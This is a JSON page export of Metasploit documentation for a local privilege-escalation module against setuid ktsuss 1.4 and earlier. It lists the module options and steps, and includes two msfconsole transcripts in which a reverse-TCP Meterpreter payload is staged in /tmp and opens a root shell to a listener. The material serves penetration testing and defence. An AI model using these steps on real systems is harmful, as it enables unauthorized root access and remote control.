{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/ktsuss_suid_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"ecff99e4-ecec-5173-a6c8-c7b4851e9440","name":"ktsuss suid Privilege Escalation","fullname":"exploit/linux/local/ktsuss_suid_priv_esc","description":"This module attempts to gain root privileges by exploiting\n        a vulnerability in ktsuss versions 1.4 and prior.\n\n        The ktsuss executable is setuid root and does not drop\n        privileges prior to executing user specified commands,\n        resulting in command execution with root privileges.\n\n        This module has been tested successfully on:\n\n        ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and\n        ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/ktsuss_suid_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/ktsuss_suid_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/ktsuss_suid_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges by exploiting\na vulnerability in ktsuss versions 1.4 and prior.</p>\n<p>  The <code class=\"language-text\">ktsuss</code> executable is setuid <code class=\"language-text\">root</code> and does not drop\nprivileges prior to executing user specified commands,\nresulting in command execution with <code class=\"language-text\">root</code> privileges.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64)</li>\n<li>ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64)</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use exploit/linux/local/ktsuss_suid_priv_esc</code></li>\n<li><code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>KTSUSS_PATH</strong></p>\n<p>  Path to <code class=\"language-text\">ktsuss</code> executable (default: <code class=\"language-text\">/usr/bin/ktsuss</code>)</p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ktsuss-13-on-sparkylinux-58-lxqt-x64\" style=\"position:relative;\"><a href=\"#ktsuss-13-on-sparkylinux-58-lxqt-x64\" aria-label=\"ktsuss 13 on sparkylinux 58 lxqt x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/ktsuss_suid_priv_esc \nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; check\n\n[+] /usr/bin/ktsuss is setuid\n[*] uid=1001(test) gid=1001(test) euid=0(root) groups=1001(test)\n[+] The target is vulnerable.\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set payload linux/x64/meterpreter/reverse_tcp \npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.165:4444 \n[+] /usr/bin/ktsuss is setuid\n[*] uid=1001(test) gid=1001(test) euid=0(root) groups=1001(test)\n[*] Writing &#39;/tmp/.lBanpIYpAJ60cwt&#39; (389 bytes) ...\n[*] Executing payload ...\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 172.16.191.137\n\n[*] Meterpreter session 2 opened (172.16.191.165:4444 -&gt; 172.16.191.137:53060) at 2019-08-19 09:18:29 -0400\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.137\nOS           : Sparky 5.8 (Linux 4.19.0-5-amd64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ktsuss-13-on-sparkylinux-6-201908-lxqt-x64\" style=\"position:relative;\"><a href=\"#ktsuss-13-on-sparkylinux-6-201908-lxqt-x64\" aria-label=\"ktsuss 13 on sparkylinux 6 201908 lxqt x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/ktsuss_suid_priv_esc \nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; check\n\n[+] /usr/bin/ktsuss is setuid\n[*] uid=1001(test) gid=1002(test) euid=0(root) groups=1002(test)\n[+] The target is vulnerable.\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(linux/local/ktsuss_suid_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.165:4444 \n[+] /usr/bin/ktsuss is setuid\n[*] uid=1001(test) gid=1002(test) euid=0(root) groups=1002(test)\n[*] Writing &#39;/tmp/.R0aTPpB8aHk&#39; (389 bytes) ...\n[*] Executing payload ...\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 172.16.191.167\n\n[*] Meterpreter session 2 opened (172.16.191.165:4444 -&gt; 172.16.191.167:44534) at 2019-08-19 09:25:48 -0400\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.167\nOS           : Sparky 6 (Linux 4.19.0-5-amd64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ecff99e4-ecec-5173-a6c8-c7b4851e9440"}}}